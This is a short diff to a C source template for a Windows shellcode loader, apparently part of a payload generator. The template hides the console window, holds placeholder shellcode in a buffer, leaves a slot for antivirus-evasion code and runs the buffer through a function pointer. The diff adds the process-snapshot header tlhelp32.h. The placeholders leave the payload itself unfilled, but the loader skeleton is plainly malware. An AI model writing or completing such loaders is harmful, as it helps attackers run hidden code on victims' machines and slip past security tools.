@@ -2,6 +2,7 @@
 #define VAR10 0x00000000
 #include <stdio.h>
 #include <Windows.h>
+#include <tlhelp32.h>
 
 VOID [FUNC_NAME](DWORD *VAR6, DWORD VAR7, CHAR **VAR8) {
         CHAR VAR5[] = "[CHARSET_ARRAY]";
@@ -22,8 +23,8 @@ int main() {
         ShowWindow(GetConsoleWindow(), SW_HIDE);
         FreeConsole();
         char VAR3[] = "[SHELLCODE]";
-
-		    [EVASION]
+	
+	[EVASION]
 		
         int(*VAR4)(void);
         VAR4 = (int(*)())VAR3;
